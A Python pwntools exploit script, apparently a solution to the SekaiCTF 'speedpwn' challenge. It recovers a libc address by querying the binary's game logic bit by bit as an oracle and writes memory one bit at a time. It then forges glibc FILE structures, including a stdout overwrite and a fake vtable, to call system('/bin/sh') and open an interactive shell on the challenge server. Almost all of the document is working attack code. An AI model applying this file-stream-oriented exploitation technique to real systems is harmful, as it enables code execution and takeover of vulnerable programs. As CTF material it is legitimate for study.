from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./speedpwn"
file_args = []
io: process = None
PREFIX = b"> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("speedpwn.chals.sekai.team", 1337, ssl=True)

def launch_local():
    global file, io
    io = process([file, *args])
    if args.DEBUG:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def countSetBits(n): 
        count = 0
        while (n): 
            count += n & 1
            n >>= 1
        return count 

    def test(val):
        sprefix(b"s")
        sla(b"number: ", b"-")
        snum(b"number: ", val)
        leak = recvu(b"f) Fight bot")
        return int(b"Bot win!" in leak)
        


    def find_bits():
        for i in range(64):
            val = int(("1"*i).ljust(64, "0"), 2)
            if not test(val):
                return i - 1
        
    def find_secret():
        secret_bits = find_bits()

        recovery = ""
        recovery_bits = 0
        for i in range(48):
            print(recovery)

            val = int(("1"*(secret_bits-1-recovery_bits)).ljust(63-len(recovery), "0") + "1" + recovery, 2)
            # print("one empty", bin(val))
            one_empty = test(val)
            val = int((recovery[::-1] + "1"*(secret_bits-recovery_bits)).ljust(64, "0")[::-1], 2)
            # print("one full", bin(val))
            one_full = test(val)

            if one_empty != one_full:
                recovery = "1" + recovery
                recovery_bits += 1
                continue

            recovery = "0" + recovery
            
        return int("1"+ recovery[recovery.find("1"):], 2)

    def reseed():
        sprefix(b"r")


    def play(val):
        sprefix(b"f")
        leak = recvu(b"Player")
        bot_num = int(getb(leak, b"plays ", b"!\n"))
        bot_bits = countSetBits(bot_num)
        num = 0xffffffffffffffff if val else 0
        snum(b"plays: ", num)
    def write(data):
        for i in data:
            write_byte(i)
    def write_byte(val):
        for _ in range(8):
            print(_)
            play(val & 1)
            val >>= 1
    def write_64(val):
        for _ in range(64):
            play(val & 1)
            val >>= 1
    
    free_area = 0x4040a0

    libc.address = find_secret() - 0x955c2
    success("libc: %#018x" % libc.address)

    write(b"A"*0x10)
    write_64(free_area)
    
    # write(payload)

    payload = flat([
        0xfbad0000,
        0, # _IO_read_ptr
        0, # _IO_read_end
        0, # _IO_read_base
        
        0, # _IO_write_base
        0, # _IO_write_ptr
        0, # _IO_write_end
        
        libc.sym["_IO_2_1_stdout_"], # _IO_buf_base
        libc.sym["_IO_2_1_stdout_"]+0xf8, # _IO_buf_end

        0, # _IO_save_base
        0, # _IO_backup_base
        0, # _IO_save_end
        
        0, # _markers
        0, # _chain
        0, # _fileno + flags2

        -1, # _old_offset

        0, # _cur_column
        # _vtable_offset
        # _shortbuf

        0x404f00, # _lock

        0, # _offset

        0, # _codecvt
        0, # _wide_data

        0, # _freeres_list / unknown2
        0, # _freeres_buf
        0, # __pad5
        0, # _mode

        0, # _unused2
        0,

        libc.sym["_IO_file_jumps"], # vtable
    ])
    write(payload)

    reseed()

    file = FileStructure()
    file.flags = 0x3b01010101010101
    file._IO_read_ptr = b"/bin/sh\0"
    file._lock =  0x404e00
    file._wide_data = libc.sym["_IO_2_1_stdout_"] + 0x10
    file.vtable = libc.address + 0x2022b0
    payload = bytes(file) + p64(libc.sym.system) + p64(0) + p64(libc.sym["_IO_2_1_stdout_"] + 0xe0 - 0x68)

    print(hex(len(payload)))

    sl(payload)

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)